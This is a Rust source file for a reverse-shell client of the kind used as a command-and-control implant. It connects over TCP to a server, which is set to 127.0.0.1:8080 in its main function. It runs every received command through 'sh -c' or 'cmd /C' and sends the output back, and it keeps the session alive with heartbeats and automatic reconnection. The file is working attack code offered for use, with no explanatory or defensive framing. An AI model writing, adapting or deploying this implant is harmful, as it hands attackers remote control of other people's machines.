use std::process::Command;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use std::error::Error;
use std::fmt;
use tokio::time::{sleep, Duration};
use serde::{Serialize, Deserialize};
use std::time::Instant;

// Custom error type
#[derive(Debug)]
pub enum ClientError {
    Transport(String),
    Command(String),
    Serialization(String),
    Connection(String),
}

impl fmt::Display for ClientError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ClientError::Transport(msg) => write!(f, "Transport error: {}", msg),
            ClientError::Command(msg) => write!(f, "Command error: {}", msg),
            ClientError::Serialization(msg) => write!(f, "Serialization error: {}", msg),
            ClientError::Connection(msg) => write!(f, "Connection error: {}", msg),
        }
    }
}

impl Error for ClientError {}

// Message types for structured communication
#[derive(Debug, Serialize, Deserialize)]
pub enum Message {
    Command(String),
    Output(Vec<u8>),
    Error(String),
    Heartbeat,
}

// Transport trait for protocol abstraction
#[async_trait::async_trait]
pub trait Transport {
    async fn connect(&mut self, addr: &str) -> Result<(), ClientError>;
    async fn send(&mut self, msg: &Message) -> Result<(), ClientError>;
    async fn recv(&mut self) -> Result<Message, ClientError>;
    async fn reconnect(&mut self) -> Result<(), ClientError>;
}

// TCP Transport implementation
pub struct TcpTransport {
    stream: Option<TcpStream>,
    addr: String,
    reconnect_delay: Duration,
}

impl TcpTransport {
    pub fn new(reconnect_delay: Duration) -> Self {
        Self { 
            stream: None,
            addr: String::new(),
            reconnect_delay,
        }
    }
}

#[async_trait::async_trait]
impl Transport for TcpTransport {
    async fn connect(&mut self, addr: &str) -> Result<(), ClientError> {
        self.addr = addr.to_string();
        match TcpStream::connect(addr).await {
            Ok(stream) => {
                self.stream = Some(stream);
                println!("[+] Connected to {}", addr);
                Ok(())
            }
            Err(e) => Err(ClientError::Connection(e.to_string()))
        }
    }

    async fn reconnect(&mut self) -> Result<(), ClientError> {
        println!("[*] Attempting reconnection...");
        sleep(self.reconnect_delay).await;
        let addr = self.addr.clone();
        self.connect(&addr).await
    }

    async fn send(&mut self, msg: &Message) -> Result<(), ClientError> {
        let stream = self.stream.as_mut()
            .ok_or_else(|| ClientError::Transport("Not connected".into()))?;
        
        // Serialize message
        let data = bincode::serialize(msg)
            .map_err(|e| ClientError::Serialization(e.to_string()))?;
        
        let len = data.len() as u32;
        let mut msg_bytes = len.to_le_bytes().to_vec();
        msg_bytes.extend(data);
        
        stream.write_all(&msg_bytes).await
            .map_err(|e| ClientError::Transport(e.to_string()))
    }

    async fn recv(&mut self) -> Result<Message, ClientError> {
        let stream = self.stream.as_mut()
            .ok_or_else(|| ClientError::Transport("Not connected".into()))?;
        
        // Read length prefix
        let mut len_bytes = [0u8; 4];
        stream.read_exact(&mut len_bytes).await
            .map_err(|e| ClientError::Transport(e.to_string()))?;
        
        let len = u32::from_le_bytes(len_bytes) as usize;
        let mut data = vec![0u8; len];
        
        stream.read_exact(&mut data).await
            .map_err(|e| ClientError::Transport(e.to_string()))?;
        
        bincode::deserialize(&data)
            .map_err(|e| ClientError::Serialization(e.to_string()))
    }
}

// Command handler trait
#[async_trait::async_trait]
pub trait CommandHandler {
    async fn handle(&self, cmd: &str) -> Result<Vec<u8>, ClientError>;
}

// Shell command handler implementation
pub struct ShellCommandHandler;

#[async_trait::async_trait]
impl CommandHandler for ShellCommandHandler {
    async fn handle(&self, cmd: &str) -> Result<Vec<u8>, ClientError> {
        let output = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(["/C", cmd])
                .output()
        } else {
            Command::new("sh")
                .args(["-c", cmd])
                .output()
        }.map_err(|e| ClientError::Command(e.to_string()))?;

        let mut result = Vec::new();
        if !output.stdout.is_empty() {
            result.extend(&output.stdout);
        }
        if !output.stderr.is_empty() {
            if !result.is_empty() {
                result.extend(b"\n");
            }
            result.extend(&output.stderr);
        }
        
        Ok(result)
    }
}

// Client struct to manage transport and command handling
pub struct Client {
    transport: Box<dyn Transport>,
    command_handler: Box<dyn CommandHandler>,
    max_retries: u32,
}

impl Client {
    pub fn new(
        transport: Box<dyn Transport>, 
        command_handler: Box<dyn CommandHandler>,
        max_retries: u32,
    ) -> Self {
        Self {
            transport,
            command_handler,
            max_retries,
        }
    }

    pub async fn run(&mut self, addr: &str) -> Result<(), ClientError> {
        let mut retry_count = 0;
        
        loop {
            match self.connect_and_run(addr).await {
                Ok(_) => {
                    // Server closed gracefully, exit without error
                    return Ok(());
                }
                Err(e) => {
                    eprintln!("[!] Error: {}", e);
                    if retry_count >= self.max_retries {
                        return Err(e);
                    }
                    retry_count += 1;
                    if let Err(e) = self.transport.reconnect().await {
                        eprintln!("[!] Reconnection failed: {}", e);
                        return Err(e);
                    }
                }
            }
        }
    }

    async fn connect_and_run(&mut self, addr: &str) -> Result<(), ClientError> {
        self.transport.connect(addr).await?;
        
        let mut heartbeat_interval = tokio::time::interval(Duration::from_secs(30));
        let mut last_seen = Instant::now();
        
        loop {
            tokio::select! {
                _ = heartbeat_interval.tick() => {
                    // Send heartbeat and check last seen time
                    if last_seen.elapsed() > Duration::from_secs(45) {
                        return Err(ClientError::Connection("Server heartbeat timeout".into()));
                    }
                    if let Err(e) = self.transport.send(&Message::Heartbeat).await {
                        eprintln!("[!] Failed to send heartbeat: {}", e);
                        return Err(e);
                    }
                }
                result = self.transport.recv() => {
                    match result {
                        Ok(Message::Command(cmd)) => {
                            last_seen = Instant::now();
                            let output = self.command_handler.handle(&cmd).await;
                            match output {
                                Ok(output) => {
                                    self.transport.send(&Message::Output(output)).await?;
                                }
                                Err(e) => {
                                    self.transport.send(&Message::Error(e.to_string())).await?;
                                }
                            }
                        }
                        Ok(Message::Heartbeat) => {
                            last_seen = Instant::now();
                            self.transport.send(&Message::Heartbeat).await?;
                        }
                        Ok(_) => {
                            eprintln!("[!] Received unexpected message type from server");
                            continue;
                        }
                        Err(ClientError::Transport(msg)) if msg.contains("eof") => {
                            println!("[*] Server closed connection. Exiting...");
                            return Ok(());
                        }
                        Err(e) => return Err(e),
                    }
                }
            }
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let transport = Box::new(TcpTransport::new(Duration::from_secs(5)));
    let command_handler = Box::new(ShellCommandHandler);
    
    let mut client = Client::new(transport, command_handler, 3);
    client.run("127.0.0.1:8080").await?;
    
    Ok(())
}